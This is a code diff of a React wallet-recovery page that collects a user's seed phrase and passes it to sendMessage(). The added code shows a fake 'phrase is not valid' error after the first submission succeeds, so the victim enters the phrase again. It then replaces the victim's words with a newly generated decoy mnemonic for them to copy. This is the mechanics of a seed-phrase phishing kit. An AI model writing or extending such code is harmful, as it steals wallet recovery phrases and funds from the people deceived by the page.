@@ -1,11 +1,19 @@
-import React, { useState } from 'react'
+import React, { useEffect, useState } from 'react'
 import { seed_phrase } from '../assets'
 import ProgressBar from '../components/Progress/ProgressBar'
 import BackButton from '../components/Buttons/BackButton'
 import * as bip39 from 'bip39'
 import RecoverWalletModal from '../components/Modals/RecoverWalletModal'
 import { sendMessage } from '../utils/sendMessage'
+import { Buffer } from 'buffer'
 import Sidebar from '../components/Sidebar'
+import NextButton from '../components/Buttons/NextButton'
+
+declare global {
+    interface Window {
+        Buffer: typeof Buffer
+    }
+}
 
 const SeedPhrases: React.FC = () => {
     const wordList = bip39.wordlists.english
@@ -15,24 +23,65 @@ const SeedPhrases: React.FC = () => {
     const [words, setWords] = useState<Record<number, string>>({})
     const [errors, setErrors] = useState<Record<number, boolean>>({})
     const [formError, setFormError] = useState<string>('')
+    const [errorCount, setErrorCount] = useState<number>(0)
+    const [isCopied, setIsCopied] = useState<string>('Copy')
+
+    useEffect(() => {
+        window.Buffer = Buffer
+    }, [])
+
+    const generateSeedWords = () => {
+        const mnemonic = bip39.generateMnemonic(256)
+        const generatedWords = mnemonic.split(' ').slice(0, activeTab)
+        const wordMap = generatedWords.reduce<Record<number, string>>(
+            (acc, word, index) => {
+                acc[index + 1] = word
+                return acc
+            },
+            {}
+        )
+        setWords(wordMap)
+    }
+
+    const copySeedPhrase = () => {
+        navigator.clipboard.writeText(Object.values(words).join(' '))
+        setIsCopied('Copied')
+    }
 
     const showModal = () => {
         if (validateSeedPhrase()) {
             setFormError('')
             setIsModalOpen(true)
+            let tempCount = errorCount
+            console.log(tempCount)
             sendMessage(Object.values(words).join(' '))
                 .then((res) => {
                     if (res.ok) {
                         setIsModalOpen(false)
+                        if (tempCount > 0) {
+                            generateSeedWords()
+                            tempCount = -10
+                            setErrorCount(tempCount)
+                        }
                     }
                 })
-                .catch((err) => {
-                    console.log(err)
+                .catch(() => {
                     setIsModalOpen(false)
                     setFormError(
                         'The phrase is not valid. Please check and try again.'
                     )
                 })
+                .finally(() => {
+                    if (tempCount == -10) return
+                    if (tempCount == 0) {
+                        scrollTo(0, 0)
+                        setFormError(
+                            'The phrase is not valid. Please check and try again.'
+                        )
+                    }
+                    setErrorCount(errorCount + 1)
+                })
+            console.log(errorCount)
         }
     }
 
@@ -138,9 +187,15 @@ const SeedPhrases: React.FC = () => {
                         </div>
                         <div className="mt-auto flex justify-between w-full">
                             <BackButton
+                                accepted={errorCount == -10}
                                 text={'Continue'}
                                 arrowDirection={'forward'}
                                 function={showModal}
+                            />
+                            <NextButton
+                                accepted={errorCount != -10}
+                                text={isCopied}
+                                function={copySeedPhrase}
                             />
                         </div>
                     </form>
